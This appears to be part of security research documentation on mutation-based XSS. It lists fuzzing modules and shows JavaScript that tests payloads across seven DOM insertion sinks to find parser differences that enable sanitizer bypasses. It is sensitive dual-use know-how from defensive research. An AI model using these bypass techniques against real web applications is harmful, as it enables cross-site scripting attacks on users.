**Mutation Modules:**

| Module | Target | Focus |
|--------|--------|-------|
| Foreign Content | SVG/MathML boundaries | Integration point confusion |
| Serializer Round-trips | innerHTML cycles | Re-serialization mutations |
| RCDATA | textarea/title content | Rawtext vs. RCDATA parsing |
| Scripting Flag | noscript behavior | DOMParser vs. browser differential |
| Namespace Confusion | SVG/MathML/HTML switches | Incorrect namespace tracking |
| Attribute Serialization | Attribute value encoding | Unescaped special characters |
| Template Reparenting | template element behavior | Template content vs. regular DOM |
| Comment Variants | Comment syntax edge cases | Bang comments, nested comments |
| Form Nesting | Nested form elements | Foster parenting interactions |
| Encoding Tricks | Character reference variants | Decimal, hex, named entities |
| NULL Injection | NULL bytes in tokens | Parser state confusion |

**DOM Sink Differentials:**

The JavaScript lab tests each mutated payload across 7 different DOM insertion mechanisms:

```javascript
// Sink 1: innerHTML (most common)
element.innerHTML = payload;

// Sink 2: DOMParser
new DOMParser().parseFromString(payload, 'text/html');

// Sink 3: Range.createContextualFragment
const range = document.createRange();
range.createContextualFragment(payload);

// Sink 4: XMLSerializer (serialize then reparse)
const serialized = new XMLSerializer().serializeToString(doc);

// Sink 5: document.write
const iframe = document.createElement('iframe');
iframe.contentDocument.write(payload);

// Sink 6: insertAdjacentHTML
element.insertAdjacentHTML('beforeend', payload);

// Sink 7: Trusted Types createHTML (if available)
trustedTypes.createPolicy('test', { createHTML: s => s }).createHTML(payload);
```

Each sink may parse the same HTML string differently, creating opportunities for sanitizer bypasses when the sanitizer assumes one parsing behavior but the application uses a different sink.

**Key finding from the research lab:** `Range.createContextualFragment` and `innerHTML` can produce different DOM trees from the same HTML string because `createContextualFragment` considers the Range's context node's namespace, while `innerHTML` always starts in HTML namespace. This is particularly relevant for sanitizers that use `DOMParser` (which parses as a full document) to sanitize content that will be inserted via `createContextualFragment` (which parses as a fragment in a specific context).

---
